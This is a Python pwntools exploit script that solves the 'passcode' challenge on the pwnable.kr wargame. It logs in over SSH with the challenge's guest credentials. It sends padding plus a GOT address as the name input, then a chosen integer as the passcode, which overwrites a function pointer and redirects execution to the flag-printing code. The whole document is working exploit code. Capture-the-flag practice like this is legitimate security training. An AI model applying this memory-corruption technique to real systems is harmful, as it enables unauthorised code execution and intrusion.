from pwn import *

context(arch='i386', os='linux', log_level='debug')
shell = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./passcode')
io.recvuntil("enter you name : ")
payload = b'a'*96 + p32(0x804a004)
io.sendline(payload)
io.recvuntil("enter passcode1 : ")
io.sendline(b'134514147')  # str.encode(str(0x80485e3))
flag = io.recv()
log.success(flag)
# Sorry mom.. I got confused about scanf usage :(
# Now I can safely trust you that you have credential :)
io.close()
shell.close()